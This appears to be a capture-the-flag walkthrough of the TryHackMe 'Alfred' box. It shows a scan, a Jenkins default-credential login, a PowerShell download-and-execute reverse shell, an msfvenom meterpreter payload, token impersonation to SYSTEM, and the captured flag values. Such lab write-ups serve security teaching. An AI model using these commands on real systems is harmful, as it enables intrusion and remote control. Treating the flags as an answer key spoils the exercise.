@@ -1,0 +1,198 @@
+Nmap Scan:
+
+Nmap scan report for 10.10.224.56
+Host is up (0.21s latency).
+Not shown: 65532 filtered ports
+PORT     STATE SERVICE            VERSION
+80/tcp   open  http               Microsoft IIS httpd 7.5
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/7.5
+|_http-title: Site doesn't have a title (text/html).
+3389/tcp open  ssl/ms-wbt-server?
+8080/tcp open  http               Jetty 9.4.z-SNAPSHOT
+| http-robots.txt: 1 disallowed entry 
+|_/
+|_http-server-header: Jetty(9.4.z-SNAPSHOT)
+|_http-title: Site doesn't have a title (text/html;charset=utf-8).
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 402.09 seconds
+root@natzsec:~/Desktop/tryhackme/boxes/alfred# 
+
+Ports opened are 80, 3389, 8080
+
+alfred.thm:8080
+
+Shows a jenkins login page and the username password was so lazy.
+
+admin:admin
+
+For reverse shell, click on the existing project and goto configure.
+
+Add the powershell command to execute the powershell reverseshell script.
+
+https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
+
+run the webserver and host this file then under the "Execute Command" section 
+
+powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port
+
+We will get our reverse shell in our listner.
+
+root@natzsec:~/Desktop/tryhackme/boxes/alfred# nc -lvnp 1337
+listening on [any] 1337 ...
+connect to [10.11.5.22] from (UNKNOWN) [10.10.224.56] 49197
+Windows PowerShell running as user bruce on ALFRED
+Copyright (C) 2015 Microsoft Corporation. All rights reserved.
+
+PS C:\Program Files (x86)\Jenkins\workspace\project>cd C:\
+PS C:\> dir
+
+
+    Directory: C:\
+
+
+Mode                LastWriteTime     Length Name                              
+----                -------------     ------ ----                              
+d----        10/25/2019   2:21 PM            inetpub                           
+d----         7/13/2009   8:20 PM            PerfLogs                          
+d-r--        10/26/2019   4:12 PM            Program Files                     
+d-r--        10/25/2019   1:54 PM            Program Files (x86)               
+d-r--        10/26/2019   1:22 PM            Users                             
+d----        10/26/2019   4:25 PM            Windows                           
+
+
+PS C:\> cd Users
+PS C:\Users> dir
+
+
+    Directory: C:\Users
+
+
+Mode                LastWriteTime     Length Name                              
+----                -------------     ------ ----                              
+d----        10/25/2019  12:05 PM            bruce                             
+d----        10/25/2019   2:21 PM            DefaultAppPool                    
+d-r--        11/20/2010  11:16 PM            Public                            
+
+
+PS C:\Users> cd bruce
+PS C:\Users\bruce> cd Desktop
+PS C:\Users\bruce\Desktop> dir
+
+
+    Directory: C:\Users\bruce\Desktop
+
+
+Mode                LastWriteTime     Length Name                              
+----                -------------     ------ ----                              
+-a---        10/25/2019   3:22 PM         32 user.txt                          
+
+
+PS C:\Users\bruce\Desktop> more user.txt
+79007a09481963edf2e1321abd9ae2a0
+
+Using msfvenom created a payload for a better shell.
+
+msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.11.5.22 LPORT=1234 -f exe -o meter.exe
+
+downloaded it on the machine using the powershell command line.
+
+powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.11.5.22/meter.exe','meter.exe')"
+
+After executing we got a reverse meterpreter shell.
+
+msf5 > use exploit/multi/handler 
+msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
+payload => windows/meterpreter/reverse_tcp
+msf5 exploit(multi/handler) > set LHOST 10.11.5.22
+LHOST => 10.11.5.22
+msf5 exploit(multi/handler) > set LPORT 1234
+LPORT => 1234
+msf5 exploit(multi/handler) > show options
+
+Module options (exploit/multi/handler):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     10.11.5.22       yes       The listen address (an interface may be specified)
+   LPORT     1234             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+
+msf5 exploit(multi/handler) > run
+
+[*] Started reverse TCP handler on 10.11.5.22:1234 
+[*] Sending stage (180291 bytes) to 10.10.224.56
+[*] Meterpreter session 1 opened (10.11.5.22:1234 -> 10.10.224.56:49199) at 2020-05-11 09:20:49 +0530
+
+meterpreter > getuid
+Server username: alfred\bruce
+meterpreter > 
+
+So from there we can either migrate to a process which will get us NT Authority\System or else we can use SeImpersonate to impersonate the Builtin\Administrators token also to get the NT Authority\System
+
+meterpreter > impersonate_token "BUILTIN\Administrators"
+[-] Warning: Not currently running as SYSTEM, not all tokens will be available
+             Call rev2self if primary process token is SYSTEM
+[+] Delegation token available
+[+] Successfully impersonated user NT AUTHORITY\SYSTEM
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+
+C:\Windows\system32>hostname
+hostname
+alfred
+
+C:\Windows\system32>cd config
+cd config
+
+C:\Windows\System32\config>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is E033-3EDD
+
+ Directory of C:\Windows\System32\config
+
+05/10/2020  08:50 PM    <DIR>          .
+05/10/2020  08:50 PM    <DIR>          ..
+10/25/2019  02:46 PM            28,672 BCD-Template
+05/10/2020  08:50 PM        18,087,936 COMPONENTS
+05/10/2020  08:32 PM           262,144 DEFAULT
+07/13/2009  07:34 PM    <DIR>          Journal
+05/10/2020  08:32 PM    <DIR>          RegBack
+10/26/2019  04:36 AM                70 root.txt
+05/10/2020  08:02 PM           262,144 SAM
+05/10/2020  08:13 PM           262,144 SECURITY
+05/10/2020  09:02 PM        38,797,312 SOFTWARE
+05/10/2020  09:02 PM         9,961,472 SYSTEM
+11/20/2010  07:41 PM    <DIR>          systemprofile
+10/25/2019  01:47 PM    <DIR>          TxR
+               8 File(s)     67,661,894 bytes
+               6 Dir(s)  20,475,961,344 bytes free
+
+C:\Windows\System32\config>type root.txt
+type root.txt
+dff0f748678f280250f25a45b8046b4a
+
+C:\Windows\System32\config>
